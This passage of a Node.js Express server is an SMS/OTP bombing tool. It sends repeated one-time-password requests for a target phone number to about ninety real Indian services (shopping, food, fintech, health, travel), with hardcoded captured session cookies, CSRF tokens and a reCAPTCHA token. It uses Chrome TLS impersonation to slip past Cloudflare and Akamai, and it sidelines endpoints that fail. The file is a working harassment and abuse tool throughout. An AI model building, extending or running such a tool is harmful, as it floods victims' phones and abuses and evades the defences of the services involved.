import express from 'express';
import axios from 'axios';
import { Impit } from 'impit';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC_DIR = path.join(__dirname, 'public');

const PORT = Number(process.env.PORT) || 3000;
const HOST = process.env.HOST || '0.0.0.0';
const REQ_TIMEOUT = Number(process.env.REQ_TIMEOUT) || 12000;

const DEFAULTS = {
  repeat: 5,
  stagger: 70,
  resendGap: 2500,
};

const BENCH_AFTER = 3;
const BENCH_MS = 10 * 60 * 1000;

const UA =
  'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 ' +
  '(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36';

/* Chrome-TLS impersonation. Sirf un endpoints ke liye jo `cf: true` hain. */
const impit = new Impit({ browser: 'chrome' });

/* ============================================================
   VOLATILE VALUES
   Ye capture ke saath badalte hain. Agar koi service 400/403
   de rahi ho to sabse pehle YAHI refresh karo — neeche endpoints
   array chhune ki zaroorat nahi.
   ============================================================ */

// Nykaa — x-csrf-token + PHPSESSID ka joda (rotate hota hai)
const NYKAA_CSRF = 'plItKXf7zbGkMlOj';
const NYKAA_SESSION = 'a1QasYaKAmjzoK31792746214961';

// Blinkit — auth_key /v2/accounts/auth_key/ se aati hai
const BLINKIT_AUTH = 'c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477';
const BLINKIT_DEVICE = '2f017ff841730f22';
const BLINKIT_SESSION = '27c74e4f-ef1c-4c5b-aee0-d4d9f9f00b03';

// Redbus — reCAPTCHA v3 token, ~2 minute me expire hota hai
const REDBUS_CAPTCHA =
  '0cAFcWeA5m5Xe2t3EBO3ZO7_Qy6gd9hgGLjKndg2iejsYAHToC0jm68nFN2HrFIOQbo1kMm9i7L9qSGV8KCiUiuX4gF4jXz4swhnCTMYj8x5m1JidD2ADuCBF0OHJLBZKdyFPcGQoEsNGwub9kUz_tJo1_DuZPOflJCv8YBqPhIRx1hTtuCkUN1pHl0Y1cYUrjmRX00-_3int7nj3Pdi-ElIKLF5Omym0d7QejtXm8img6Q1Y5eE5SqTo0WmDaDj7ErAKytqmnJ77ExXsfnQMqjZPP7LVh3MB5dL1NmjwP1WgZC-gFyqmYbESCad_yVvdEgFC-QEYPzPTBIEoNaZP3Y54zQ-Srqth895ql9VNLAZoyamXEO5Ppgu86V9K3cXnNjEsBCS5dnv8c5hXf6FlUvQmDP-soJwPgDZ-CQksKSAcmGmp3bue10SbiXOQ2zwaeoAR3Wv5puexj1khK3EyUqnfxpz5HLAh3GGuqdNq9FvTuNfXBNGZcg7sbAWaHpUb3_RJxtMFlWgvZh4_14FnGVK0WN6M7z5YjawvxRYhwSLnEuhBjqB39S7BRYs1f1gLgovRDBBqwg3YjevPy5Vr050ujBU5MofUdR_hH_B56wJJZ2p7mMuUKWzQe7Ub9Dd6zSRyOSqf1v0BGF_3cjWldaO8L_YYbJg_EpwZtcyKI31V4LBLk9X0XneCxuNqEQ78Uc7wpCwJEW2WXgkPyRSIDckRfzbWy0G2tzBHjyCBsNF2f7IeKdgIkCw2gQa76bFe1NKhwlejrn_JDRi3DJ8Qh_OsH_JErdvrRIj6NJIS1b1Cj0LqXYlfItBe2wWzzV-EiBPqy9a3hagkwl5UG6t74XaKSYJBk_Oi6V5YOha8KrupQllN7f3IkLgy9He48V-ERzkTM84n_2GycdbX0RitcAgQJxMsZX9unYvkzQIKf82HSwCSnzSpHjSPPnx3WjHTT4DGfOx9jkWcNE-3FGzcv5zaAHgByQhLkwlwcyeqeZ-Bku36jBYFhO6F03etLjb-tJzucHSSyGNUiASAbCFcnDKjFzHjqJMhAXYbAln6verefmUixOR8Wkoo1-yWBsbeNj7Jlm-pRi0PgjX3cPT0CzJfw8OTJ4YeQClhiaufulfuRzcFsmkSr5pAvhZRioOMceHhpokYwxdJZh8eSyksMMgunUSzxhxQiLwqJiA41wWWZaNHySKD9anCAMtwIm8rXLu3wiFo2EDXX_rKvDKnx6Mh3A_YjCfbywEDfFZO9RNB27W7MgGIVFSVo-nck3l9wk7X1ynazJnoRjF5zrBbM46Rymyoi_Q3B5372MZYPiEj-xA673wH0M_0PgwczebUwj6b7rQdnks_BuHcqEhmfOBNOS8JYbht3CxXWL7nHSn1WyFf1-XQ-EHe1mfABdogOxB5mbc-ECiV4ZjM320MSo9LSww5VkuqCWjHSVU0_YKxR3kXfYCk2NUC0DvOvddnRDLGRdMDd0sWrohPH04bSqzl1XF0_7oN3s5lNKow4aWf52UY1Pi3UpxkXxIKwuwWGfAvW_rDjJ1Adi7y_dhWsXwXCWXeD5GuvNXHNutXyyI9W226mCFApi7TJ2AhsMqv6pC9KBAwI2xL-uBWfp7jcUWqpLWyodY_TE_eAeXTXvJUpvSdUtVGmBTgJQNhMoNAikuFhXwJfH-FTLgbdBRa1tvwdyqizv4TnMfsb7Ysx7bekt18zqbzsZNxReEc_ZSaiX1ZDcNMjqhJ8uBV0IwcJvDHvHbQYSOJKeUiwFLmde4rlHFbj9rhE-KITzE68kt_vHX_dNJjlG5i3Nc8YbrlK13f17XzassgAnSx0mzjt4NWyq12uYTcsqwo-5aNYtd4AOE602LMu1CTZNShdkZ2jZs9gPPp7uNhrzkiYesCXaQYpgh9QcpE1lhlRSI4sy8fvOVRDl9mFvLZrJX2qr7DC3YFXJxLM0u-_NdrEKtOVC3RD8MOM1wIR0zwZmv8tE0nbeNxXxVcN7swGu82Z3uJRwbyz7wJwa5TaZtEPkzJspJRbfbAMv0lOptSyGonxMTDi2B3CaOIBSfXTpEavOpDptxUMWYf9_XFd-7qzMAjwJxjRuMCQ0MYZwg481F_mPlVv0BaACYlQpTzTKCkCvC2dCnd1cYtMIbO29f9_774tYlkyW0xSOHKQ764nnpai4U9HPgqoWdR18vjems7HtzjB4In7Os1-1P-Y1EZO0u48xolQeUh4AaAkpRfeQY-ude2H5UozF4KTrduodkEonoS3CWigEzFq6rIP9chUIkqMbEpSsQlsAcHfdtv-XCXGzmdhR3USQ9gtJ4h12AuH_65BLH8_H210pw4nMvQWQNR9BM1L-Xu8WqA8unqaF7zBswfWMoyvAGlMjN38buF__V1HuVQh9PgRljjI7qGi2pz5DNc0fnLW0ai_B23zT3a9NVI5soZBTCmoQMhi9lQw2Iwx8-G_yRgGjwKdg9dnRCU-fqY0l4WDFxAe0MidAzUsG5kESNUQP9DdxDhbD5xR57jhtR5JzzdWoGuOLbw';

const app = express();
app.disable('x-powered-by');

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'content-type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.json({ limit: '16kb' }));

/* ================= helpers ================= */

const sleep = ms => new Promise(r => setTimeout(r, ms));
const clamp = (v, lo, hi) => Math.min(Math.max(v, lo), hi);

function normalize(raw) {
  let d = String(raw ?? '').replace(/\D/g, '');
  if (!d) return null;
  if (d.startsWith('00')) d = d.slice(2);
  if (d.length === 11 && d.startsWith('0')) d = d.slice(1);
  if (d.length === 10) d = '91' + d;
  if (d.length < 11 || d.length > 15) return null;
  return { ten: d.slice(-10), cc: d, plus: '+' + d };
}

function H(origin, referer) {
  let o;
  try { o = new URL(origin).origin; } catch { o = origin; }
  return { origin: o, referer: referer || o + '/' };
}

const tpl = (s, n) => String(s)
  .replace(/\{ten\}/g, n.ten)
  .replace(/\{cc\}/g, n.cc)
  .replace(/\{plus\}/g, n.plus);

function judge(status, body) {
  if (status < 200 || status >= 300) return { ok: false, note: 'http ' + status };
  if (body && typeof body === 'object') {
    if (body.success === false) return { ok: false, note: 'success:false' };
    if (body.status === false) return { ok: false, note: 'status:false' };
    if (body.ok === false) return { ok: false, note: 'ok:false' };
    if (typeof body.error === 'string' && body.error.trim())
      return { ok: false, note: 'error: ' + body.error.trim().slice(0, 40) };
    if (body.errors) {
      const c = Array.isArray(body.errors) ? body.errors.length : Object.keys(body.errors).length;
      if (c) return { ok: false, note: 'errors' };
    }
  }
  return { ok: true, note: 'ok' };
}

function snippet(body) {
  if (body === undefined || body === null || body === '') return '';
  let s;
  try { s = typeof body === 'string' ? body : JSON.stringify(body); }
  catch { s = String(body); }
  s = s.replace(/\s+/g, ' ').trim();
  return s.length > 140 ? s.slice(0, 140) + '…' : s;
}

/* ================= health stats / benching ================= */

const stats = new Map();

function getStat(name) {
  let s = stats.get(name);
  if (!s) { s = { ok: 0, fail: 0, streak: 0, benchedUntil: 0 }; stats.set(name, s); }
  return s;
}

function record(name, ok, benchable) {
  const s = getStat(name);
  if (ok) {
    s.ok++; s.streak = 0; s.benchedUntil = 0;
    return;
  }
  s.fail++;
  if (benchable) {
    s.streak++;
    if (s.streak >= BENCH_AFTER) s.benchedUntil = Date.now() + BENCH_MS;
  }
}

const isBenched = name => {
  const s = stats.get(name);
  return !!s && s.benchedUntil > Date.now();
};

const benchWorthy = r => r.status === 0 || r.status === 404 || r.status >= 500;

/* ================= endpoints =================
   Naya service:
     { name: 'Xyz', method: 'POST',
       url: 'https://site.com/api/send-otp',
       headers: H('https://site.com'),
       json: n => ({ phone: n.ten }) },   // ya form: n => ({...})
   Placeholders: {ten} = 10 digit | {cc} = 91+number | {plus} = +91+number
   Cloudflare / Akamai wale pe `cf: true` daalo.
   ============================================ */

const endpoints = [
  /* ---- shopping ---- */
  { name: 'Flipkart', method: 'POST',
    url: 'https://www.flipkart.com/api/5/user/otp/generate',
    headers: { ...H('https://www.flipkart.com'), 'x-user-agent': 'Mozilla/5.0 FKUA/website/41/website/Desktop' },
    form: n => ({ loginId: '+91' + n.ten }) },

  { name: 'Snapdeal', method: 'POST',
    url: 'https://www.snapdeal.com/sendOTP',
    headers: { ...H('https://www.snapdeal.com', 'https://www.snapdeal.com/iframeLogin'), 'x-requested-with': 'XMLHttpRequest' },
    form: n => ({ emailId: '', mobileNumber: n.ten, purpose: 'LOGIN_WITH_MOBILE_OTP' }) },

  { name: 'Myntra', method: 'POST',
    url: 'https://www.myntra.com/gateway/v2/user/otp/generate',
    headers: { ...H('https://www.myntra.com'), 'x-myntraweb': 'Yes' },
    json: n => ({ mobileNumber: n.ten }) },

  { name: 'Ajio', method: 'POST',
    url: 'https://www.ajio.com/api/auth/sendOtp',
    headers: H('https://www.ajio.com'),
    json: n => ({ mobileNumber: n.ten, isResend: false }), resendKey: 'isResend' },

  { name: 'Meesho', method: 'POST',
    url: 'https://www.meesho.com/api/v1/otp/send',
    headers: H('https://www.meesho.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'TataCliq', method: 'POST',
    url: 'https://www.tatacliq.com/api/v1/user/otp/generate',
    headers: H('https://www.tatacliq.com'),
    json: n => ({ mobileNumber: n.ten }) },

  { name: 'Nykaa', cf: true, method: 'POST',
    url: 'https://www.nykaa.com/app-api/index.php/customer/send_otp',
    headers: {
      ...H('https://www.nykaa.com'),
      'x-csrf-token': NYKAA_CSRF,
      cookie: 'PHPSESSID=' + NYKAA_SESSION,
    },
    form: n => ({ platform: 'web', mobile_number: n.ten }) },

  { name: 'Purplle', method: 'POST',
    url: 'https://www.purplle.com/api/v1/user/send-otp',
    headers: H('https://www.purplle.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Bewakoof', method: 'POST',
    url: 'https://www.bewakoof.com/api/v1.0/user/otp/generate',
    headers: H('https://www.bewakoof.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Lenskart', method: 'POST',
    url: 'https://api.lenskart.com/v1/customers/otp/generate',
    headers: H('https://www.lenskart.com'),
    json: n => ({ phone: n.ten, isd_code: '91' }) },

  { name: 'FirstCry', method: 'POST',
    url: 'https://www.firstcry.com/api/otp/send',
    headers: H('https://www.firstcry.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Fynd', method: 'POST',
    url: 'https://api.fynd.com/service/application/auth/send-otp',
    headers: H('https://www.fynd.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Naaptol', method: 'GET',
    url: 'https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile={ten}' },

  { name: 'HomeShop18', method: 'POST',
    url: 'https://mbe.homeshop18.com/services/secure/user/generate/otp',
    headers: { 'x-hs18-app-version': '3.1.0', 'x-hs18-app-id': '0',
               'x-hs18-device-version': '25', 'x-hs18-app-platform': 'androidApp' },
    form: n => ({ submit: 'submit', identity: n.ten, otpType: 'SIGNUP_OTP' }) },

  { name: 'IffcoBazar', method: 'POST',
    url: 'https://www.iffcobazar.in/login_otp.html',
    headers: H('https://www.iffcobazar.in', 'https://www.iffcobazar.in/login_otp.html'),
    form: n => ({ submitted: 'yes', phone_no: n.ten }) },

  { name: 'Spencers', method: 'GET',
    url: 'https://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone={ten}' },

  /* ---- food & grocery ---- */
  { name: 'Zomato', method: 'POST',
    url: 'https://www.zomato.com/php/o2_api/otp.php',
    headers: H('https://www.zomato.com'),
    form: n => ({ phoneNumber: n.ten, country_id: '1', type: 'sendOtp' }) },

  { name: 'Swiggy', method: 'POST',
    url: 'https://www.swiggy.com/dapi/auth/sms-otp',
    headers: H('https://www.swiggy.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Blinkit', method: 'POST',
    url: 'https://api.grofers.com/v2/web/auth/send_otp',
    headers: H('https://blinkit.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Zepto', method: 'POST',
    url: 'https://api.zeptonow.com/api/v1/auth/send-otp',
    headers: H('https://www.zeptonow.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Dominos', method: 'POST',
    url: 'https://www.dominos.co.in/api/v1/customer/send-otp',
    headers: H('https://www.dominos.co.in'),
    json: n => ({ mobile: n.ten }) },

  { name: 'BigBasket', method: 'POST',
    url: 'https://www.bigbasket.com/api/v1/otp/send',
    headers: H('https://www.bigbasket.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'JioMart', method: 'POST',
    url: 'https://www.jiomart.com/api/v1/otp/send',
    headers: H('https://www.jiomart.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Licious', method: 'POST',
    url: 'https://www.licious.in/api/v1/otp/send',
    headers: H('https://www.licious.in'),
    json: n => ({ phone: n.ten }) },

  /* ---- health ---- */
  { name: 'PharmEasy', method: 'POST',
    url: 'https://pharmeasy.in/api/v1/send_otp',
    headers: H('https://pharmeasy.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Netmeds', method: 'POST',
    url: 'https://www.netmeds.com/sociallogin/popup/checkmobileno/',
    headers: { ...H('https://www.netmeds.com', 'https://www.netmeds.com/customer/account/create/'), 'x-requested-with': 'XMLHttpRequest' },
    form: n => ({ register_mobileno: n.ten }) },

  { name: 'Tata1mg', method: 'POST',
    url: 'https://www.1mg.com/api/v1/otp/send',
    headers: H('https://www.1mg.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'HealthKart', method: 'GET',
    url: 'https://www.healthkart.com/api/user/login/send/otp/{ten}?trackingSource=HM-LPOPUP' },

  { name: 'Practo', method: 'POST',
    url: 'https://www.practo.com/api/v1/otp/send',
    headers: H('https://www.practo.com'),
    json: n => ({ phone: n.ten }) },

  /* ---- travel ---- */
  { name: 'Goibibo', method: 'POST',
    url: 'https://www.goibibo.com/common/downloadsms/',
    headers: H('https://www.goibibo.com', 'https://www.goibibo.com/mobile/?sms=success'),
    form: n => ({ mbl: n.ten }) },

  { name: 'Redbus', cf: true, method: 'POST',
    url: 'https://www.redbus.in/rpw/api/sendOtpV2',
    headers: H('https://www.redbus.in'),
    json: n => ({
      phoneCode: '91',
      mobile: n.ten,
      reCaptchaResponse: REDBUS_CAPTCHA,
      whatsappOptin: true,
    }) },

  { name: 'Treebo', method: 'POST',
    url: 'https://www.treebo.com/api/v2/auth/login/otp/',
    headers: { ...H('https://www.treebo.com', 'https://www.treebo.com/login/'), authorization: 'Bearer null' },
    json: n => ({ phone_number: n.ten }) },

  { name: 'MakeMyTrip', method: 'POST',
    url: 'https://www.makemytrip.com/api/otp/send',
    headers: H('https://www.makemytrip.com'),
    json: n => ({ phone: n.ten }) },

  /* ---- fintech ---- */
  { name: 'Mobikwik', method: 'POST',
    url: 'https://appapi.mobikwik.com/p/account/otp/cell',
    headers: { 'x-app-ver': '1', 'x-mclient': '1' },
    json: n => ({ cell: n.ten }) },

  { name: 'Paisabazaar', method: 'POST',
    url: 'https://myaccount.paisabazaar.com/my-account/',
    headers: { ...H('https://myaccount.paisabazaar.com'), 'x-requested-with': 'XMLHttpRequest' },
    form: n => ({ mobile_number: n.ten, step: 'send_password', request_page: 'landing' }) },

  { name: 'Cashify', method: 'POST',
    url: 'https://www.cashify.in/api/v1/send-otp',
    headers: H('https://www.cashify.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Groww', method: 'POST',
    url: 'https://groww.in/v1/api/otp/generate',
    headers: H('https://groww.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Upstox', method: 'POST',
    url: 'https://api.upstox.com/login/openapi/v2/login',
    headers: H('https://upstox.com'),
    json: n => ({ mobile_number: n.cc }) },

  { name: 'Zerodha', method: 'POST',
    url: 'https://kite.zerodha.com/api/login',
    headers: H('https://kite.zerodha.com'),
    form: n => ({ user_id: n.ten, password: 'abc123' }) },

  { name: 'Cred', method: 'POST',
    url: 'https://api.cred.club/apiv1/cred/otp/generate',
    headers: H('https://cred.club'),
    json: n => ({ phone: n.ten }) },

  { name: 'Policybazaar', method: 'POST',
    url: 'https://www.policybazaar.com/api/v1/otp/send',
    headers: H('https://www.policybazaar.com'),
    json: n => ({ mobile: n.ten }) },

  /* ---- learning ---- */
  { name: 'Unacademy', method: 'POST',
    url: 'https://unacademy.com/api/v3/user/send_otp',
    headers: H('https://unacademy.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Vedantu', method: 'POST',
    url: 'https://api.vedantu.com/v1/users/otp',
    headers: H('https://www.vedantu.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Toppr', method: 'POST',
    url: 'https://api.toppr.com/v1/otp/send',
    headers: H('https://www.toppr.com'),
    json: n => ({ phone: n.ten }) },

  /* ---- local services ---- */
  { name: 'UrbanCompany', method: 'POST',
    url: 'https://www.urbancompany.com/api/v1/otp/send',
    headers: H('https://www.urbancompany.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'NoBroker', method: 'POST',
    url: 'https://www.nobroker.in/api/v1/otp/send',
    headers: H('https://www.nobroker.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Sulekha', method: 'GET',
    url: 'https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber={ten}&rnd=0' },

  { name: 'Justdial', method: 'GET',
    url: 'https://www.justdial.com/functions/ajxandroid.php?phn={ten}&em=a%40b.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile' },

  { name: 'Rapido', method: 'POST',
    url: 'https://api.rapido.bike/v1/otp/send',
    headers: H('https://rapido.bike'),
    json: n => ({ phone: n.ten }) },

  { name: 'TataDocomo', method: 'GET',
    url: 'https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP?mobile={ten}' },

  { name: 'Hike', method: 'POST',
    url: 'https://api.im.hike.in/v3/account/validate?digits=4',
    json: n => ({ method: 'pin', msisdn: '+91' + n.ten }) },

  { name: 'NDTV', method: 'GET',
    url: 'https://www.narendramodi.in/site/senddnldlink?contact_no=91{ten}' },

  /* ==================== EXTRA BATCH ==================== */

  /* ---- shopping (extra) ---- */
  { name: 'TataNeu', method: 'POST',
    url: 'https://www.tataneu.com/api/v1/auth/otp/send',
    headers: H('https://www.tataneu.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Croma', method: 'POST',
    url: 'https://www.croma.com/api/v1/otp/send',
    headers: H('https://www.croma.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'RelianceDigital', method: 'POST',
    url: 'https://www.reliancedigital.in/api/v1/otp/send',
    headers: H('https://www.reliancedigital.in'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Decathlon', method: 'POST',
    url: 'https://www.decathlon.in/api/auth/send-otp',
    headers: H('https://www.decathlon.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Zivame', method: 'POST',
    url: 'https://www.zivame.com/api/v1/otp/send',
    headers: H('https://www.zivame.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'MyGlamm', method: 'POST',
    url: 'https://www.myglamm.com/api/v1/otp/send',
    headers: H('https://www.myglamm.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'ShopClues', method: 'POST',
    url: 'https://www.shopclues.com/api/v1/send-otp',
    headers: H('https://www.shopclues.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Limeroad', method: 'POST',
    url: 'https://www.limeroad.com/api/v1/otp/send',
    headers: H('https://www.limeroad.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Tira', method: 'POST',
    url: 'https://www.tira.com/api/otp/send',
    headers: H('https://www.tira.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Boat', method: 'POST',
    url: 'https://www.boat-lifestyle.com/api/otp/send',
    headers: H('https://www.boat-lifestyle.com'),
    json: n => ({ phone: n.ten }) },

  /* ---- food (extra) ---- */
  { name: 'Box8', method: 'POST',
    url: 'https://api.box8.in/v1/otp/send',
    headers: H('https://box8.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Faasos', method: 'POST',
    url: 'https://api.faasos.io/v1/otp/send',
    headers: H('https://faasos.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'WowMomo', method: 'POST',
    url: 'https://www.wowmomo.com/api/otp/send',
    headers: H('https://www.wowmomo.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'BurgerKing', method: 'POST',
    url: 'https://www.burgerking.in/api/otp/send',
    headers: H('https://www.burgerking.in'),
    json: n => ({ mobile: n.ten }) },

  { name: 'PizzaHut', method: 'POST',
    url: 'https://www.pizzahut.co.in/api/otp/send',
    headers: H('https://www.pizzahut.co.in'),
    json: n => ({ mobile: n.ten }) },

  /* ---- travel (extra) ---- */
  { name: 'Goomo', method: 'POST',
    url: 'https://auth.goomo.com/v2/phone_confirmation/verify_user',
    headers: H('https://www.goomo.com'),
    json: n => ({ email: 'bomber@hi2.in', phone_number: n.ten, country_code: '91' }) },

  { name: 'Cleartrip', method: 'POST',
    url: 'https://www.cleartrip.com/api/v1/otp/send',
    headers: H('https://www.cleartrip.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Ixigo', method: 'POST',
    url: 'https://www.ixigo.com/api/v1/otp/send',
    headers: H('https://www.ixigo.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Yatra', method: 'POST',
    url: 'https://www.yatra.com/api/v1/otp/send',
    headers: H('https://www.yatra.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'EaseMyTrip', method: 'POST',
    url: 'https://www.easemytrip.com/api/v1/otp/send',
    headers: H('https://www.easemytrip.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Oyo', method: 'POST',
    url: 'https://www.oyorooms.com/api/v1/otp/send',
    headers: H('https://www.oyorooms.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Abhibus', method: 'POST',
    url: 'https://www.abhibus.com/api/v1/otp/send',
    headers: H('https://www.abhibus.com'),
    json: n => ({ mobile: n.ten }) },

  /* ---- fintech (extra) ---- */
  { name: 'Paytm', method: 'POST',
    url: 'https://accounts.paytm.com/signin/otp',
    headers: H('https://accounts.paytm.com'),
    json: n => ({ phone: '+91' + n.ten }) },

  { name: 'Freecharge', method: 'POST',
    url: 'https://www.freecharge.in/api/v1/otp/send',
    headers: H('https://www.freecharge.in'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Slice', method: 'POST',
    url: 'https://api.sliceit.com/v1/otp/send',
    headers: H('https://www.sliceit.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Navi', method: 'POST',
    url: 'https://api.navi.com/v1/otp/send',
    headers: H('https://navi.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'FivePaisa', method: 'POST',
    url: 'https://api.5paisa.com/v1/otp/send',
    headers: H('https://www.5paisa.com'),
    json: n => ({ mobile: n.ten }) },

  /* ---- health (extra) ---- */
  { name: 'Apollo247', method: 'POST',
    url: 'https://www.apollo247.com/api/v1/otp/send',
    headers: H('https://www.apollo247.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'CultFit', method: 'POST',
    url: 'https://www.cult.fit/api/v1/otp/send',
    headers: H('https://www.cult.fit'),
    json: n => ({ phone: n.ten }) },

  { name: 'MedPlus', method: 'POST',
    url: 'https://www.medplusmart.com/api/v1/otp/send',
    headers: H('https://www.medplusmart.com'),
    json: n => ({ mobile: n.ten }) },

  /* ---- learning (extra) ---- */
  { name: 'PhysicsWallah', method: 'POST',
    url: 'https://api.penpencil.co/v1/otp/send',
    headers: H('https://www.pw.live'),
    json: n => ({ phone: n.ten }) },

  { name: 'Testbook', method: 'POST',
    url: 'https://api.testbook.com/v1/otp/send',
    headers: H('https://testbook.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Adda247', method: 'POST',
    url: 'https://www.adda247.com/api/v1/otp/send',
    headers: H('https://www.adda247.com'),
    json: n => ({ mobile: n.ten }) },

  /* ---- others (extra) ---- */
  { name: 'Tinder', method: 'POST',
    url: 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms',
    headers: H('https://tinder.com'),
    json: n => ({ phone_number: '+91' + n.ten }) },

  { name: 'MagicBricks', method: 'POST',
    url: 'https://www.magicbricks.com/mbapi/otp/send',
    headers: H('https://www.magicbricks.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Housing', method: 'POST',
    url: 'https://housing.com/api/v1/otp/send',
    headers: H('https://housing.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Porter', method: 'POST',
    url: 'https://api.porter.in/v1/otp/send',
    headers: H('https://porter.in'),
    json: n => ({ phone: n.ten }) },

  /* ---- Blinkit (web) ---- */
  { name: 'BlinkitWeb', cf: true, method: 'POST',
    url: 'https://blinkit.com/v2/accounts/',
    headers: {
      ...H('https://blinkit.com'),
      auth_key: BLINKIT_AUTH,
      device_id: BLINKIT_DEVICE,
      session_uuid: BLINKIT_SESSION,
      app_client: 'consumer_web',
      platform: 'mobile_web',
      app_version: '52434332',
      web_app_version: '1008010016',
      rn_bundle_version: '1009003012',
      lat: '28.4465616',
      lon: '77.040489',
    },
    form: n => ({ user_phone: n.ten }) },
];

/* ================= request builder ================= */

function buildRequest(ep, n, attempt) {
  const isResend = attempt > 1;
  const cfg = {
    method: ep.method || 'GET',
    url: tpl(ep.url, n),
    timeout: REQ_TIMEOUT,
    maxRedirects: 5,
    validateStatus: () => true,
    responseType: 'text',
    transformResponse: [d => {
      if (typeof d !== 'string') return d;
      try { return JSON.parse(d); } catch { return d; }
    }],
    headers: {
      'user-agent': UA,
      accept: 'application/json, text/plain, */*',
      'accept-language': 'en-IN,en;q=0.9',
      ...(ep.headers || {}),
    },
  };

  if (isResend) cfg.headers['cache-control'] = 'no-cache';

  const raw = ep.json ? ep.json(n, attempt) : ep.form ? ep.form(n, attempt) : null;

  if (raw) {
    const payload = { ...raw };
    if (isResend && ep.resendKey) payload[ep.resendKey] = true;
    if (ep.json) {
      cfg.data = JSON.stringify(payload);
      cfg.headers['content-type'] = 'application/json';
    } else {
      cfg.data = new URLSearchParams(payload).toString();
      cfg.headers['content-type'] = 'application/x-www-form-urlencoded';
    }
  } else if (isResend) {
    cfg.params = { _t: Date.now() };
  }
  return cfg;
}

async function hit(ep, n, attempt) {
  const t0 = Date.now();
  try {
    const cfg = buildRequest(ep, n, attempt);
    let status, data;

    if (ep.cf) {
      // Cloudflare / Akamai wale endpoints -> Chrome TLS impersonation
      const qs = cfg.params ? '?' + new URLSearchParams(cfg.params) : '';
      const r = await impit.fetch(cfg.url + qs, {
        method: cfg.method,
        headers: cfg.headers,
        body: cfg.data,
      });
      status = r.status;
      const text = await r.text();
      try { data = JSON.parse(text); } catch { data = text; }
    } else {
      const r = await axios(cfg);
      status = r.status;
      data = r.data;
    }

    const verdict = judge(status, data);
    return {
      name: ep.name, attempt, ok: verdict.ok, note: verdict.note,
      status, ms: Date.now() - t0, snippet: snippet(data),
    };
  } catch (err) {
    return {
      name: ep.name, attempt, ok: false,
      note: err.code || err.message || 'network',
      status: err.response?.status || 0,
      ms: Date.now() - t0, snippet: '',
    };
  }
}

/* ================= core ================= */

async function runBomb(n, opts, onEvent) {
  const { repeat, stagger, resendGap, skipDead } = opts;

  const pool = skipDead ? endpoints.filter(ep => !isBenched(ep.name)) : endpoints;
  const active = pool.length ? pool : endpoints;
  const total = active.length * repeat;
  const started = Date.now();

  onEvent({
    type: 'start', number: n.plus, services: active.length,
    total, repeat, skipped: endpoints.length - active.length,
  });

  let done = 0, sent = 0, failed = 0;
  const results = [];
  const jobs = [];
  let i = 0;

  for (const ep of active) {
    const base = i * stagger;
    for (let a = 1; a <= repeat; a++) {
      const delay = base + (a - 1) * resendGap;
      jobs.push((async () => {
        if (delay > 0) await sleep(delay);
        const r = await hit(ep, n, a);
        done++;
        r.ok ? sent++ : failed++;
        record(ep.name, r.ok, benchWorthy(r));
        results.push(r);
        onEvent({ type: 'result', done, total, sent, failed, ...r });
      })());
    }
    i++;
  }

  await Promise.all(jobs);

  const summary = { type: 'done', total, sent, failed, elapsed: Date.now() - started };
  onEvent(summary);
  return { ...summary, number: n.plus, results };
}

function readOpts(body) {
  const b = body || {};
  return {
    repeat: clamp(parseInt(b.repeat, 10) || DEFAULTS.repeat, 1, 10),
